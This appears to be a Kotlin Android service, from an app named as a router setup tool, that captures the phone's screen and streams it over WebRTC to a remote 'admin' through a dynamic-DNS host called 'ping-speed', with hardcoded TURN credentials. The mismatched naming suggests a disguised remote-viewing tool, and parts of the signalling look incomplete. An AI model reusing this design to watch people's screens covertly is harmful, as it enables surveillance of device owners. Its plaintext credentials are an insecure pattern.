package com.example.routersetup

import android.app.*
import android.content.pm.ServiceInfo
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import kotlinx.coroutines.*
import org.json.JSONObject
import org.webrtc.*

class ScreenCaptureService : Service() {
    companion object {
        private const val TAG = "ScreenCaptureService"
        private const val CHANNEL_ID = "SCREEN_CAPTURE_CHANNEL"
        private const val NOTIF_ID = 1
    }

    private lateinit var projectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null

    private lateinit var peerConnectionFactory: PeerConnectionFactory
    private var peerConnection: PeerConnection? = null

    private lateinit var socket: Socket
    private var adminSocketId: String? = null

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "onCreate()")
        projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        initializePeerConnectionFactory()
        setupSocket()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand")

        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIF_ID, notification)
        }

        val resultCode = intent?.getIntExtra("code", Activity.RESULT_CANCELED) ?: Activity.RESULT_CANCELED
        val dataIntent = intent?.getParcelableExtra<Intent>("data") // Берём Intent из результата

        if (resultCode == Activity.RESULT_OK && dataIntent != null) {
            val callback = object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.d(TAG, "MediaProjection stopped.")
                }
            }
            // Передаём dataIntent в конструктор ScreenCapturerAndroid
            val screenCapturer = ScreenCapturerAndroid(dataIntent, callback)

            // Настраиваем захват экрана и WebRTC
            val eglBase = EglBase.create()
            val surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBase.eglBaseContext)
            val videoSource = peerConnectionFactory.createVideoSource(false)

            screenCapturer.initialize(
                surfaceTextureHelper,
                applicationContext,
                videoSource.capturerObserver
            )

            try {
                screenCapturer.startCapture(720, 1280, 30)
                Log.d(TAG, "Screen capture started successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Error starting screen capture: ${e.message}")
                stopSelf()
                return START_NOT_STICKY
            }

            // Логируем кадры для диагностики
            videoSource.capturerObserver.onFrameCaptured { Log.d(TAG, "Frame captured") }

            val videoTrack = peerConnectionFactory.createVideoTrack("screenTrack", videoSource)
            val localStream = peerConnectionFactory.createLocalMediaStream("localStream")
            localStream.addTrack(videoTrack)

            if (peerConnection == null) {
                createPeerConnection()
            }
            peerConnection?.addStream(localStream)
        } else {
            Log.e(TAG, "MediaProjection not obtained. Stopping service.")
            stopSelf()
        }

        return START_NOT_STICKY
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screen Capture Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Screen Capture Service")
            .setContentText("Screen capturing is running...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun initializePeerConnectionFactory() {
        val initOptions = PeerConnectionFactory.InitializationOptions
            .builder(this)
            .setEnableInternalTracer(true)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(initOptions)

        peerConnectionFactory = PeerConnectionFactory.builder()
            .setOptions(PeerConnectionFactory.Options())
            .createPeerConnectionFactory()
    }

    private fun setupSocket() {
        try {
            socket = IO.socket("https://ping-speed.ddns.net")
            socket.connect()
            socket.on(Socket.EVENT_CONNECT) {
                Log.d(TAG, "Socket.IO connected!")
                socket.emit("readyForOffer")
            }
            socket.on(Socket.EVENT_DISCONNECT) {
                Log.d(TAG, "Socket.IO disconnected.")
                peerConnection?.close()
            }

            socket.on("webrtcSignal") { args ->
                serviceScope.launch {
                    if (args.isNotEmpty()) {
                        val data = args[0] as JSONObject
                        val signalObj = data.getJSONObject("signal")
                        val from = data.optString("from", "")
                        if (from.isNotEmpty()) {
                            adminSocketId = from
                        }
                        val type = signalObj.getString("type")
                        when (type) {
                            "answer" -> handleAnswer(signalObj)
                            "candidate" -> handleCandidate(signalObj)
                            else -> {
                                Log.w(TAG, "Unknown signal type: $type")
                            }
                        }
                    }
                }
            }

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun createPeerConnection() {
        Log.d(TAG, "createPeerConnection()")
        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("turn:176.126.70.215:3478")
                .setUsername("test")
                .setPassword("password123")
                .createIceServer()
        )
        val rtcConfig = PeerConnection.RTCConfiguration(iceServers)

        peerConnection = peerConnectionFactory.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate?) {
                candidate?.let {
                    Log.d(TAG, "Got local ICE candidate: $it")
                    val candidateJson = JSONObject().apply {
                        put("type", "candidate")
                        put("candidate", JSONObject().apply {
                            put("candidate", it.sdp)
                            put("sdpMid", it.sdpMid)
                            put("sdpMLineIndex", it.sdpMLineIndex)
                        })
                    }
                    val payload = JSONObject().apply {
                        put("signal", candidateJson)
                        put("targetId", adminSocketId)
                    }
                    socket.emit("webrtcSignal", payload)
                }
            }
            override fun onSignalingChange(newState: PeerConnection.SignalingState?) {}
            override fun onIceConnectionChange(newState: PeerConnection.IceConnectionState?) {
                Log.d(TAG, "IceConnectionState changed: $newState")
            }
            override fun onIceConnectionReceivingChange(receiving: Boolean) {}
            override fun onIceGatheringChange(newState: PeerConnection.IceGatheringState?) {}
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onAddStream(stream: MediaStream?) {
                Log.d(TAG, "onAddStream: ${stream?.id}")
            }
            override fun onRemoveStream(stream: MediaStream?) {
                Log.d(TAG, "onRemoveStream: ${stream?.id}")
            }
            override fun onDataChannel(channel: DataChannel?) {}
            override fun onTrack(transceiver: RtpTransceiver?) {}
            override fun onRenegotiationNeeded() {
                Log.d(TAG, "onRenegotiationNeeded")
            }
            override fun onAddTrack(receiver: RtpReceiver?, mediaStreams: Array<out MediaStream>?) {}
        })
    }

    private fun createOffer() {
        Log.d(TAG, "createOffer()")
        if (peerConnection == null) {
            createPeerConnection()
        }
        val constraints = MediaConstraints()
        peerConnection?.createOffer(object : SimpleSdpObserver() {
            override fun onCreateSuccess(desc: SessionDescription?) {
                Log.d(TAG, "createOffer success: $desc")
                peerConnection?.setLocalDescription(object : SimpleSdpObserver() {}, desc)
                val offerJson = JSONObject().apply {
                    put("type", "offer")
                    put("sdp", desc?.description)
                }
                val payload = JSONObject().apply {
                    put("signal", offerJson)
                    put("targetId", adminSocketId)
                }
                socket.emit("webrtcSignal", payload)
            }
            override fun onCreateFailure(error: String?) {
                Log.e(TAG, "createOffer failure: $error")
            }
        }, constraints)
    }

    private suspend fun handleAnswer(signalObj: JSONObject) {
        val sdp = signalObj.getString("sdp")
        val sessionDescription = SessionDescription(SessionDescription.Type.ANSWER, sdp)
        withContext(Dispatchers.Main) {
            peerConnection?.setRemoteDescription(object : SimpleSdpObserver() {
                override fun onSetSuccess() {
                    Log.d(TAG, "Remote ANSWER setSuccess()")
                }
                override fun onSetFailure(error: String?) {
                    Log.e(TAG, "Remote ANSWER setFailure: $error")
                }
            }, sessionDescription)
        }
    }

    private suspend fun handleCandidate(signalObj: JSONObject) {
        val candidateObj = signalObj.getJSONObject("candidate")
        val candidate = IceCandidate(
            candidateObj.getString("sdpMid"),
            candidateObj.getInt("sdpMLineIndex"),
            candidateObj.getString("candidate")
        )
        withContext(Dispatchers.Main) {
            peerConnection?.addIceCandidate(candidate)
            Log.d(TAG, "Added ICE candidate from admin.")
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "onDestroy()")
        socket.disconnect()
        serviceScope.cancel()
        peerConnection?.close()
        mediaProjection?.stop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
